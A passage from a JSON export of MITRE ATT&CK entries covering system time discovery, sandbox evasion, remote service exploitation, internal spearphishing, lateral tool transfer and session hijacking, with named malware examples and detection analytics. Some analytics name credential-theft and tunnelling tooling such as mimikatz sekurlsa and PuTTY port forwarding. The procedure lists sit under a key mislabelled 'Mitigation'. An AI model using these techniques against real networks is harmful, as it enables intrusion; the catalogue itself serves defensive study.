        "description": "During Operation CuckooBees, the threat actors used the net time command as part of their advanced reconnaissance.[57]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors used the time command to retrieve the current time of a compromised system.[58]"
      },
      {
        "id": "S0501",
        "name": "PipeMon",
        "description": "PipeMon can send time zone information from a compromised host to C2.[59]"
      },
      {
        "id": "S0139",
        "name": "PowerDuke",
        "description": "PowerDuke has commands to get the time the machine was built, the time, and the time zone.[60]"
      },
      {
        "id": "S0238",
        "name": "Proxysvc",
        "description": "As part of the data reconnaissance phase, Proxysvc grabs the system time to send back to the control server.[50]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot can identify the system time on a targeted host.[61]"
      },
      {
        "id": "S0148",
        "name": "RTM",
        "description": "RTM can obtain the victim time zone.[62]"
      },
      {
        "id": "S0596",
        "name": "ShadowPad",
        "description": "ShadowPad has collected the current date and time of the victim system.[63]"
      },
      {
        "id": "S0140",
        "name": "Shamoon",
        "description": "Shamoon obtains the system time and will only activate if it is greater than a preset date.[64][65]"
      },
      {
        "id": "S0450",
        "name": "SHARPSTATS",
        "description": "SHARPSTATS has the ability to identify the current date and time on the compromised host.[66]"
      },
      {
        "id": "G0121",
        "name": "Sidewinder",
        "description": "Sidewinder has used tools to obtain the current system time.[67]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY can collect start time information from a compromised host.[68]"
      },
      {
        "id": "S0615",
        "name": "SombRAT",
        "description": "SombRAT can execute getinfo  to discover the current time on a compromised host.[69][70]"
      },
      {
        "id": "S0380",
        "name": "StoneDrill",
        "description": "StoneDrill can obtain the current date and time of the victim machine.[71]"
      },
      {
        "id": "S1034",
        "name": "StrifeWater",
        "description": "StrifeWater can collect the time zone from the victim's machine.[72]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet collects the time and date of a system when it is infected.[73]"
      },
      {
        "id": "S1064",
        "name": "SVCReady",
        "description": "SVCReady can collect time zone information.[74]"
      },
      {
        "id": "S0098",
        "name": "T9000",
        "description": "T9000 gathers and beacons the system time during installation.[75]"
      },
      {
        "id": "S0011",
        "name": "Taidoor",
        "description": "Taidoor can use GetLocalTime and GetSystemTime to collect system time.[76]"
      },
      {
        "id": "S0586",
        "name": "TAINTEDSCRIBE",
        "description": "TAINTEDSCRIBE can execute GetLocalTime for time discovery.[77]"
      },
      {
        "id": "S0467",
        "name": "TajMahal",
        "description": "TajMahal has the ability to determine local time on a compromised host.[78]"
      },
      {
        "id": "G0089",
        "name": "The White Company",
        "description": "The White Company has checked the current date on the victim system.[79]"
      },
      {
        "id": "S0678",
        "name": "Torisma",
        "description": "Torisma can collect the current time on a victim machine.[80]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla surveys a system upon check-in to discover the system time by using the net time command.[35]"
      },
      {
        "id": "S0275",
        "name": "UPPERCUT",
        "description": "UPPERCUT has the capability to obtain the time zone information and current timestamp of the victim’s machine.[81]"
      },
      {
        "id": "S0466",
        "name": "WindTail",
        "description": "WindTail has the ability to generate the current date and time.[82]"
      },
      {
        "id": "S0251",
        "name": "Zebrocy",
        "description": "Zebrocy gathers the current time zone and date information from the system.[83][84]"
      },
      {
        "id": "S0330",
        "name": "Zeus Panda",
        "description": "Zeus Panda collects the current system time (UTC) and sends it back to the C2 server.[85]"
      },
      {
        "id": "G0128",
        "name": "ZIRCONIUM",
        "description": "ZIRCONIUM has used a tool to capture the time on a compromised host in order to register it with C2.[86]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for actions that may gather the system time and/or time zone from a local or remote system."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that may gather the system time and/or time zone from a local or remote system. Remote access tools with built-in features may interact directly with the Windows API to gather information."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may gather the system time and/or time zone from a local or remote system."
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "Virtualization/Sandbox Evasion",
    "Code": "T1497",
    "Description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.[1]Adversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.[2]",
    "Mitigation": [
      {
        "id": "S0331",
        "name": "Agent Tesla",
        "description": "Agent Tesla has the ability to perform anti-sandboxing and anti-virtualization checks.[3]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar can attempt to overload sandbox analysis by sending 1550 calls to printf.[4]"
      },
      {
        "id": "S0268",
        "name": "Bisonal",
        "description": "Bisonal can check to determine if the compromised system is running on VMware.[5]"
      },
      {
        "id": "S1070",
        "name": "Black Basta",
        "description": "Black Basta can make a random number of calls to the kernel32.beep function to hinder log analysis.[6]"
      },
      {
        "id": "S1039",
        "name": "Bumblebee",
        "description": "Bumblebee has the ability to perform anti-virtualization checks.[7]"
      },
      {
        "id": "S0484",
        "name": "Carberp",
        "description": "Carberp has removed various hooks before installing the trojan or bootkit to evade sandbox analysis or other analysis software.[8]"
      },
      {
        "id": "S0023",
        "name": "CHOPSTICK",
        "description": "CHOPSTICK  includes runtime checks to identify an analysis environment and prevent execution on it.[9]"
      },
      {
        "id": "S0046",
        "name": "CozyCar",
        "description": "Some versions of CozyCar will check to ensure it is not being executed inside a virtual machine or a known malware analysis sandbox environment. If it detects that it is, it will exit.[10]"
      },
      {
        "id": "G0012",
        "name": "Darkhotel",
        "description": "Darkhotel malware has employed just-in-time decryption of strings to evade sandbox detection.[11]"
      },
      {
        "id": "S0554",
        "name": "Egregor",
        "description": "Egregor has used multiple anti-analysis and anti-sandbox techniques to prevent automated analysis by sandboxes.[12][13]"
      },
      {
        "id": "S0666",
        "name": "Gelsemium",
        "description": "Gelsemium can use junk code to generate random activity to obscure malware behavior.[14]"
      },
      {
        "id": "S0499",
        "name": "Hancitor",
        "description": "Hancitor has used a macro to check that an ActiveDocument shape object in the lure message is present. If this object is not found, the macro will exit without downloading additional payloads.[15]"
      },
      {
        "id": "S1020",
        "name": "Kevin",
        "description": "Kevin can sleep for a time interval between C2 communication attempts.[16]"
      },
      {
        "id": "S0455",
        "name": "Metamorfo",
        "description": "Metamorfo has embedded a \"vmdetect.exe\" executable to identify virtual machines at the beginning of execution.[17]"
      },
      {
        "id": "C0005",
        "name": "Operation Spalax",
        "description": "During Operation Spalax, the threat actors used droppers that would run anti-analysis checks before executing malware on a compromised host.[18]"
      },
      {
        "id": "S0147",
        "name": "Pteranodon",
        "description": "Pteranodon has the ability to use anti-detection functions to identify sandbox environments.[19]"
      },
      {
        "id": "S0148",
        "name": "RTM",
        "description": "RTM can detect if it is running within a sandbox or other virtualized analysis environment.[20]"
      },
      {
        "id": "S1030",
        "name": "Squirrelwaffle",
        "description": "Squirrelwaffle has contained a hardcoded list of IP addresses to block that belong to sandboxes and analysis platforms.[21][22]"
      },
      {
        "id": "S0380",
        "name": "StoneDrill",
        "description": "StoneDrill has used several anti-emulation techniques to prevent automated analysis by emulators or sandboxes.[23]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may employ various means to detect and avoid virtualization and analysis environments. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that may employ various means to detect and avoid virtualization and analysis environments. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Virtualization, sandbox, user activity, and related discovery techniques will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1497.001",
        "name": "System Checks"
      },
      {
        "id": "T1497.002",
        "name": "User Activity Based Checks"
      },
      {
        "id": "T1497.003",
        "name": "Time Based Evasion"
      }
    ],
    "Tactic": "DefenseEvasion, Discovery"
  },
  {
    "Title": "Exploitation of Remote Services",
    "Code": "T1210",
    "Description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.An adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Discovery or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.There are several well-known vulnerabilities that exist in common services such as SMB [1] and RDP [2] as well as applications that may be used within internal networks such as MySQL [3] and web server services.[4]Depending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.",
    "Mitigation": [
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 exploited a Windows SMB Remote Code Execution Vulnerability to conduct lateral movement.[5][6][7]"
      },
      {
        "id": "S0606",
        "name": "Bad Rabbit",
        "description": "Bad Rabbit used the EternalRomance SMB exploit to spread through victim networks.[8]"
      },
      {
        "id": "S0608",
        "name": "Conficker",
        "description": "Conficker exploited the MS08-067 Windows vulnerability for remote code execution through a crafted RPC request.[9]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has exploited a Windows Netlogon vulnerability (CVE-2020-1472) to obtain access to Windows Active Directory servers.[10]"
      },
      {
        "id": "G1006",
        "name": "Earth Lusca",
        "description": "Earth Lusca has used Mimikatz to exploit a domain controller via the ZeroLogon exploit (CVE-2020-1472).[11]"
      },
      {
        "id": "S0367",
        "name": "Emotet",
        "description": "Emotet has been seen exploiting SMB via a vulnerability exploit like EternalBlue (MS17-010) to achieve lateral movement and propagation.[12][13][14][15]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire has a limited number of built-in modules for exploiting remote SMB, JBoss, and Jenkins servers.[16]"
      },
      {
        "id": "G0046",
        "name": "FIN7",
        "description": "FIN7 has exploited ZeroLogon (CVE-2020-1472) against vulnerable domain controllers.[17]"
      },
      {
        "id": "S0143",
        "name": "Flame",
        "description": "Flame can use MS10-061 to exploit a print spooler vulnerability in a remote system with a shared printer in order to move laterally.[18][19]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has exploited known vulnerabilities in remote services including RDP.[20][21][22]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can spread within a network via the BlueKeep (CVE-2019-0708) and EternalBlue (CVE-2017-0144) vulnerabilities in RDP and SMB respectively.[23]"
      },
      {
        "id": "S0532",
        "name": "Lucifer",
        "description": "Lucifer can exploit multiple vulnerabilities including EternalBlue (CVE-2017-0144) and EternalRomance (CVE-2017-0144).[24]"
      },
      {
        "id": "G0045",
        "name": "menuPass",
        "description": "menuPass has used tools to exploit the ZeroLogon vulnerability (CVE-2020-1472).[25]"
      },
      {
        "id": "G0069",
        "name": "MuddyWater",
        "description": "MuddyWater has exploited the Microsoft Netlogon vulnerability (CVE-2020-1472).[26]"
      },
      {
        "id": "S0368",
        "name": "NotPetya",
        "description": "NotPetya can use two exploits in SMBv1, EternalBlue and EternalRomance, to spread itself to other remote systems on the network.[27][28][29]"
      },
      {
        "id": "S0378",
        "name": "PoshC2",
        "description": "PoshC2 contains a module for exploiting SMB via EternalBlue.[30]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot can move laterally using worm-like functionality through exploitation of SMB.[31]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet propagates using the MS10-061 Print Spooler and MS08-067 Windows Server Service vulnerabilities.[32]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "Threat Group-3390 has exploited MS17-010 to move laterally to other systems on the network.[33]"
      },
      {
        "id": "G0131",
        "name": "Tonto Team",
        "description": "Tonto Team has used EternalBlue exploits for lateral movement.[34]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot utilizes EternalBlue and EternalRomance exploits for lateral movement in the modules wormwinDll, wormDll, mwormDll, nwormDll, tabDll.[35]"
      },
      {
        "id": "S0366",
        "name": "WannaCry",
        "description": "WannaCry uses an exploit in SMBv1 to spread itself to other remote systems on a network.[36][37][38]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has exploited or attempted to exploit Zerologon (CVE-2020-1472) and EternalBlue (MS17-010) vulnerabilities.[39][40][41]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Web Application Firewalls may detect improper inputs attempting exploitation."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Use deep packet inspection to look for artifacts of common exploit traffic, such as known payloads."
      }
    ],
    "Subtechniques": "\nLateral Movement"
  },
  {
    "Title": "Internal Spearphishing",
    "Code": "T1534",
    "Description": "Adversaries may use internal spearphishing to gain access to additional information or exploit other users within the same organization after they already have access to accounts or systems within the environment. Internal spearphishing is multi-staged campaign where an email account is owned either by controlling the user's device with previously installed malware or by compromising the account credentials of the user. Adversaries attempt to take advantage of a trusted internal account to increase the likelihood of tricking the target into falling for the phish attempt.[1]Adversaries may leverage Spearphishing Attachment or Spearphishing Link as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through Input Capture on sites that mimic email login interfaces.There have been notable incidents where internal spearphishing has been used. The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process.[1] The Syrian Electronic Army (SEA) compromised email accounts at the Financial Times (FT) to steal additional account credentials. Once FT learned of the campaign and began warning employees of the threat, the SEA sent phishing emails mimicking the Financial Times IT department and were able to compromise even more users.[2]",
    "Mitigation": [
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "Gamaredon Group has used an Outlook VBA module on infected systems to send phishing emails with malicious attachments to other employees within the organization.[3]"
      },
      {
        "id": "G1001",
        "name": "HEXANE",
        "description": "HEXANE has conducted internal spearphishing attacks against executives, HR, and IT personnel to gain information and access.[4]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has sent internal spearphishing emails for lateral movement after stealing victim information.[5]"
      },
      {
        "id": "G0065",
        "name": "Leviathan",
        "description": "Leviathan has conducted internal spearphishing within the victim's environment for lateral movement.[6]"
      },
      {
        "id": "C0022",
        "name": "Operation Dream Job",
        "description": "During Operation Dream Job, Lazarus Group conducted internal spearphishing from within a compromised organization.[7]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor email gateways usually do not scan internal email, but an organization can leverage the journaling-based solution which sends a copy of emails to a security service for offline analysis or incorporate service-integrated solutions using on-premise or API-based integrations to help detect internal spearphishing attacks.[1]"
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
      }
    ],
    "Subtechniques": "\nLateral Movement"
  },
  {
    "Title": "Lateral Tool Transfer",
    "Code": "T1570",
    "Description": "Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., Ingress Tool Transfer) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB/Windows Admin Shares to connected network shares or with authenticated connections via Remote Desktop Protocol.[1]Files can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and ftp. In some cases, adversaries may be able to leverage Web Services such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.[2]",
    "Mitigation": [
      {
        "id": "C0028",
        "name": "2015 Ukraine Electric Power Attack",
        "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team moved their tools laterally within the corporate network and between the ICS and corporate network. [3]"
      },
      {
        "id": "C0025",
        "name": "2016 Ukraine Electric Power Attack",
        "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team used move to transfer files to a network share.[4]"
      },
      {
        "id": "G1007",
        "name": "Aoqin Dragon",
        "description": "Aoqin Dragon has spread malware in target networks by copying modules to folders masquerading as removable devices.[5]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 has deployed tools after moving laterally using administrative accounts.[6]"
      },
      {
        "id": "S0190",
        "name": "BITSAdmin",
        "description": "BITSAdmin can be used to create BITS Jobs to upload and/or download files from SMB file servers.[7]"
      },
      {
        "id": "S1068",
        "name": "BlackCat",
        "description": "BlackCat can replicate itself across connected servers via psexec.[8]"
      },
      {
        "id": "C0015",
        "name": "C0015",
        "description": "During C0015, the threat actors used WMI to load Cobalt Strike onto additional hosts within a compromised network.[9]"
      },
      {
        "id": "C0018",
        "name": "C0018",
        "description": "During C0018, the threat actors transferred the SoftPerfect Network Scanner and other tools to machines in the network using AnyDesk and PDQ Deploy.[10][11]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has copied tools between compromised hosts using SMB.[12]"
      },
      {
        "id": "S0106",
        "name": "cmd",
        "description": "cmd can be used to copy files to/from a remotely connected internal system.[13]"
      },
      {
        "id": "S0062",
        "name": "DustySky",
        "description": "DustySky searches for network drives and removable media and duplicates itself onto them.[14]"
      },
      {
        "id": "S0367",
        "name": "Emotet",
        "description": "Emotet has copied itself to remote systems using the service.exe filename.[15]"
      },
      {
        "id": "S0404",
        "name": "esentutl",
        "description": "esentutl can be used to copy files to/from a remote share.[16]"
      },
      {
        "id": "S0361",
        "name": "Expand",
        "description": "Expand can be used to download or upload a file over a network share.[17]"
      },
      {
        "id": "G0051",
        "name": "FIN10",
        "description": "FIN10 has deployed Meterpreter stagers and SplinterRAT instances in the victim network after moving laterally.[18]"
      },
      {
        "id": "S0095",
        "name": "ftp",
        "description": "ftp may be abused by adversaries to transfer tools or files between systems within a compromised environment.[19][20]"
      },
      {
        "id": "G0093",
        "name": "GALLIUM",
        "description": "GALLIUM has used PsExec to move laterally between hosts in the target network.[21]"
      },
      {
        "id": "S0698",
        "name": "HermeticWizard",
        "description": "HermeticWizard can copy files to other machines on a compromised network.[22]"
      },
      {
        "id": "S0372",
        "name": "LockerGoga",
        "description": "LockerGoga has been observed moving around the victim network via SMB, indicating the actors behind this ransomware are manually copying files form computer to computer instead of self-propagating.[1]"
      },
      {
        "id": "S0532",
        "name": "Lucifer",
        "description": "Lucifer can use certutil for propagation on Windows hosts within intranets.[23]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound has copied tools within a compromised network using RDP.[24]"
      },
      {
        "id": "S0457",
        "name": "Netwalker",
        "description": "Operators deploying Netwalker have used psexec to copy the Netwalker payload across accessible systems.[25]"
      },
      {
        "id": "S0365",
        "name": "Olympic Destroyer",
        "description": "Olympic Destroyer attempts to copy itself to remote machines on the network.[26]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors used SMB to copy files to and from target systems.[27]"
      },
      {
        "id": "S0029",
        "name": "PsExec",
        "description": "PsExec can be used to download or upload a file over a network share.[28]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team has used move to transfer files to a network share and has copied payloads--such as Prestige ransomware--to an Active Directory Domain Controller and distributed via the Default Domain Group Policy Object.[4][29]"
      },
      {
        "id": "S0140",
        "name": "Shamoon",
        "description": "Shamoon attempts to copy itself to remote machines on the network.[30]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet uses an RPC server that contains a file dropping routine and support for payload version updates for P2P communications within a victim network.[31]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla RPC backdoors can be used to transfer files to/from victim machines on the local network.[32][33]"
      },
      {
        "id": "G1017",
        "name": "Volt Typhoon",
        "description": "Volt Typhoon has copied web shells between servers in targeted environments.[34]"
      },
      {
        "id": "S0366",
        "name": "WannaCry",
        "description": "WannaCry attempts to copy itself to remote computers after gaining access via an SMB exploit.[35]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has used stolen credentials to copy tools into the %TEMP% directory of domain controllers.[36]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for actions for abnormal usage of utilities and command-line arguments that may be used in support of remote transfer of files"
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor newly constructed files to/from a lateral tool transfer"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Metadata",
        "detects": "Monitor for alike file hashes or characteristics (ex: filename) that are created on multiple hosts."
      },
      {
        "id": "DS0023",
        "dsource": "Named Pipe",
        "dcomp": "Named Pipe Metadata",
        "detects": "Monitor for contextual data about named pipes on the system."
      },
      {
        "id": "DS0033",
        "dsource": "Network Share",
        "dcomp": "Network Share Access",
        "detects": "Monitor for unexpected network share access, such as files transferred between shares within a network using protocols such as SMB."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor for unusual processes with internal network connections creating files on-system may be suspicious Note: Analytic Event Type is for Zeek but can also be implemented in other Network Analysis Frameworks by parsing & decoding captured SMB2 network traffic. From a network traffic capture standpoint, it’s important to capture the right traffic for this type of detection to function (e.g., all endpoint to endpoint if possible or workstation to server and workstation to workstation). As such, it is helpful to have a centralized server area where it is possible to monitor communications between servers and endpoints.Analytic 1 and 2 are very similar, with the key difference being that Implementation 2 is intended to capture multiple attempts at lateral movement originating from the same host within a short time period (5 minutes). Analytic 1 - Basic  suspicious_smb_traffic = filter log_events where ((event_id == \"smb2_write_response\" OR event_id == \"smb1_write_response\" OR event_id == \"smb1_write_andx_response\") AND (connection.smb_state.path == \"ADMIN$\" OR connection.smb_state.path == \"C$\") )Analytic 2 - Multiple Attempts (Time Window)suspicious_smb_traffic = filter log_events where ((event_id == \"smb2_write_response\" OR event_id == \"smb1_write_response\" OR event_id == \"smb1_write_andx_response\") AND (connection.smb_state.path == \"ADMIN$\" OR connection.smb_state.path == \"C$\") REPEATS 5 TIMES WITHIN 5 MINUTES FROM SAME src_ip)"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor for network traffic originating from unknown/unexpected hardware devices. Local network traffic metadata (such as source MAC addressing) as well as usage of network management protocols such as DHCP may be helpful in identifying hardware."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor newly constructed processes that assist in lateral tool transfers."
      }
    ],
    "Subtechniques": "\nLateral Movement"
  },
  {
    "Title": "Remote Service Session Hijacking",
    "Code": "T1563",
    "Description": "Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.Adversaries may commandeer these sessions to carry out actions on remote systems. Remote Service Session Hijacking differs from use of Remote Services because it hijacks an existing session rather than creating a new session using Valid Accounts.[1][2]",
    "Mitigation": [
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": "Disable the remote service (ex: SSH, RDP, etc.) if it is unnecessary."
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": "Enable firewall rules to block unnecessary traffic between network security zones within a network."
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": "Do not allow remote access to services as a privileged account unless necessary."
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": "Limit remote user permissions if remote access is necessary."
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may take control of preexisting sessions with remote services to move laterally in an environment."
      },
      {
        "id": "DS0028",
        "dsource": "Logon Session",
        "dcomp": "Logon Session Creation",
        "detects": "Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s), leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor newly executed processes that may take control of preexisting sessions with remote services to move laterally in an environment."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1563.001",
        "name": "SSH Hijacking"
      },
      {
        "id": "T1563.002",
        "name": "RDP Hijacking"
      }
    ],
    "Tactic": "\nLateral Movement"
  },
  {
    "Title": "Remote Services",
    "Code": "T1021",
    "Description": "Adversaries may use Valid Accounts to log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.In an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).[1][2] They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain. Legitimate applications (such as Software Deployment Tools and other administrative programs) may utilize Remote Services to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including VNC to send the screen and control buffers and SSH for secure file transfer.[3][4][5] Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.[6][7][4]",
    "Mitigation": [
      {
        "id": "S1063",
        "name": "Brute Ratel C4",
        "description": "Brute Ratel C4 has the ability to use RPC for lateral movement.[8]"
      },
      {
        "id": "S0437",
        "name": "Kivars",
        "description": "Kivars has the ability to remotely trigger keyboard input and mouse clicks. [9]"
      },
      {
        "id": "S1016",
        "name": "MacMa",
        "description": "MacMa can manage remote screen sessions.[10]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet can propagate via peer-to-peer communication and updates using RPC.[11]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has used the WebDAV protocol to execute Ryuk payloads hosted on network file shares.[12]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may use Valid Accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.Malicious actors may rename built-in commands or external tools, such as those provided by SysInternals, to better blend in with the environment. In those cases, the file path name is arbitrary and may blend in well with the background. If the arguments are closely inspected, it may be possible to infer what tools are running and understand what an adversary is doing. When any legitimate software shares the same command lines, it must be whitelisted according to the expected parameters.Any tool of interest with commonly known command line usage can be detecting by command line analysis. Known substrings of command lines includePuTTYport forwarding -R * -pwsecure copy (scp) -pw * * @mimikatz sekurlsa::RAR  -hp Archive* a * Additionally, it may be useful to find IP addresses in the command line\\d{1,3}.\\d{1,3}.\\d{1,3}.\\d{1,3}Analytic 1 - Suspicious Argumentsport_fwd = filter process where (command_line match \"-R . -pw\")scp = filter process where (command_line match \"-pw . . .@.\"mimikatz = filter process where (command_line match \"sekurlsa\")rar = filter process where (command_line match \" -hp \")archive = filter process where (command_line match \". a .*\")ip_addr = filter process where (command_line match \\d{1,3}.\\d{1,3}.\\d{1,3}.\\d{1,3})"
